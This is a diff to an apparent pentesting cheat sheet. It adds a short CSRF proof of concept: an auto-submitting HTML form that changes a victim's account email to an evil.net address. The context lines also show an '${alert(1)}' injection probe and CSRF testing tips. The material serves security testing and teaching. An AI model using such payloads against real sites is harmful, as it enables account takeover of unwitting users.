@@ -3030,6 +3030,16 @@ ${alert(1)}
 - Check whether CSRF token is sent over http or sent to 3rd party
 - Generate multiple CSRF tokens, pick the static part. Play with the dynamic part
 
+**Simple PoC**
+```HTML
+<form method="POST" action="https://VICTIM/my-account/settings/change-email">
+    <input type="hidden" name="email" value="user1%40evil.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+
 **Resources**
 - [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)
   - Add `<script>document.forms[0].submit();</script>` to the PoC
